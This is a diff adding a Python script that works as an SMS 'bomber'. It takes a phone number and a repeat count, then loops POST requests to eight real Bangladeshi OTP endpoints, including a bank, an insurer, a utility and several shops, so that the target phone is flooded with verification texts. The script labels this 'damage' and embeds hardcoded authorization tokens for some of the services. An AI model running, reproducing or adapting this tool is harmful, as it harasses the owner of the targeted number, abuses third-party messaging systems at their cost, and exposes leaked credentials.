@@ -1,0 +1,175 @@
+import requests
+import random
+import smtplib
+import os
+import time
+import sys
+from math import log
+from requests.structures import CaseInsensitiveDict
+
+os.system
+def artwork():
+    print("\n")
+os.system("clear")
+
+# CVALUE
+blue = '\33[94m'
+purple = '\033[95m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[04m'
+print ("\033[092m")
+import os
+os.system("clear")
+import os
+os.system("lolcat X-BannaR ")
+
+word = str(input("\t\t\t [ "+cyan+" ➙ "+green+" ] "))
+word = str(input(red+"\t\t\t [ "+cyan+" ➙ "+red+" ] "))
+os.system("clear")
+
+def logo (z):
+  for logo in z + '\n':
+     sys.stdout.write(logo)
+     sys.stdout.flush()
+     time.sleep(0.005)
+logo (blue+"""
+==========================================================
+\033[95m================       ===================  ==============
+\33[94m================  ====  ==================  ==============
+\033[95m================  ====  ==================  ==============
+\33[94m================  ====  ===   ===  =   ===  =  ===========
+\033[95m================  ====  ==  =  ==    =  ==    ============
+\33[94m================  ====  =====  ==  =======   =============
+\033[95m================  ====  ===    ==  =======    ============
+\33[94m================  ====  ==  =  ==  =======  =  ===========
+\033[95m================       ====    ==  =======  =  ===========
+\33[94m==========================================================
+\033[91m==========================================================
+\033[92m===========       =====================  =================
+\033[91m===========  ====  ====================  =================
+\033[92m===========  ====  ====================  =================
+\033[91m===========  ====  ===   ===  =  ==  ==  =================
+\033[92m===========  ====  ==  =  ==  =  ======  =================
+\033[91m===========  ====  ==     ===   ===  ==  =================
+\033[92m===========  ====  ==  ======   ===  ==  =================
+\033[91m===========  ====  ==  =  ==== ====  ==  =================
+\033[92m===========       ====   ===== ====  ==        ===========
+\033[91m==========================================================""")
+print(end+"\n")
+number  = str(input(cyan+"\t[ ★ ] \t"" 𝙀𝙣𝙩𝙚𝙧 𝙔𝙤𝙪𝙧 𝘽𝘿 𝙉𝙪𝙢𝘽𝙚𝙧 𝙏𝙮𝙥𝙀: "+green))
+amount = int(input(cyan+"\t[ ★ ] \t 𝙀𝙣𝙩𝙚𝙧 𝙔𝙤𝙪𝙧 𝘿𝙖𝙈𝙖𝙜𝙀 𝘼𝙢𝙊𝙪𝙉𝙩 𝙏𝙮𝙥𝙀: "+green))
+
+url1 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers1 = CaseInsensitiveDict()
+
+headers1["Content-Type"]="application/json; charset=UTF-8"
+
+data1 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url2 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers2["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data2 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+url3 = "https://ss.binge.buzz/otp/send/login"
+
+headers3 = CaseInsensitiveDict()
+headers3["Content-Type"] = "application/x-www-form-urlencoded"
+
+data3 = "phone="+number
+
+url4 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/x-www-form-urlencoded"
+
+data4 = "phone_number="+number
+
+url5 = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
+
+headers5 = CaseInsensitiveDict()
+
+headers5["X-Authorization"]= "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
+
+headers5["Content-Type"] = "application/json;charset=utf-8"
+
+data5 = '{"mobile_number":"'+number+'","referral":false}'
+
+url6 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers6 = CaseInsensitiveDict()
+
+headers6["Content-Length"]="48"
+
+headers6["Content-Type"]="application/json"
+
+data6 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+url7 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers7 = CaseInsensitiveDict()
+headers7["Content-Type"] = "application/json"
+
+data7 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+url8 = "https://engine.shikho.net/send_sms"
+					
+headers8 = CaseInsensitiveDict()
+headers8["Content-Type"] = "application/json"
+					
+data8 = '{"phone":"'+number+'","email":null,"auth_type":"login"}'
+
+for i in range(amount):
+	try:
+
+		resp1 = requests.post(url1, headers=headers1, data=data1)
+
+		resp2 = requests.post(url2, headers=headers2, data=data2)
+
+		resp3 = requests.post(url3, headers=headers3, data=data3)
+
+		resp4 = requests.post(url4, headers=headers4, data=data4)
+
+		resp5= requests.post(url5, headers=headers5,  data=data5)
+
+		resp6= requests.post(url6, headers=headers6,  data=data6)
+
+		resp7= requests.post(url7, headers=headers7,  data=data7)
+		
+		resp8= requests.post(url8, headers=headers8, data=data8)
+		
+		print(red+str([i + 1 ])+cyan+"\t[ ★ ] \t 𝘿𝙖𝙈𝙖𝙂𝙚  "+green+" 𝙎𝙪𝘾𝙘𝙀𝙨𝙨𝙁𝙪𝙇𝙇𝙮  "+yellow+"𝙎𝙚𝙣𝘿 "+blue+"[ ✅ ] ")
+		
+	except:
+		print (yellow+" \t[ ❎ ] \t 🅳🅰🅼🅰🅶🅴 🔥 🅽🅾🆃 🔥 🆂🅴🅽🅳  🔥 ")
+print('\033[0;35m')
+
+
+print('					')
+logo ("""\033[07m		   +-+-+-+-+-+ +-+-+-+ 
+\033[96m	  	   |T|H|A|N|K| |Y|O|U| 
+\033[95m		   +-+-+-+-+-+ +-+-+-+ """)
+print('\033[0;35m')
+logo ("""
+\33[94m       ------     \033[96m  -----------  \033[1;32m   --------   \033[0;35m  ------------         
+\33[94m      ********  \033[96m    ***********  \033[1;32m   ********  \033[0;35m   ************         
+\33[94m     ----------    \033[96m ----    ---     \033[1;32m  ----   \033[0;35m    ----                 
+\33[94m    ****    **** \033[96m   ********* \033[1;32m        ****   \033[0;35m    ************         
+\33[94m    ------------ \033[96m   ---------       \033[1;32m  ----   \033[0;35m    ------------         
+\33[94m    ************ \033[96m   ****  ****   \033[1;32m     ****   \033[0;35m    ****                 
+\33[94m    ----    ----   \033[96m ----   ----   \033[1;32m  --------   \033[0;35m  ----                 
+\33[94m    ****    ****  \033[96m  ****    **** \033[1;32m   ********  \033[0;35m   ****                 
+                                                                          """)
+
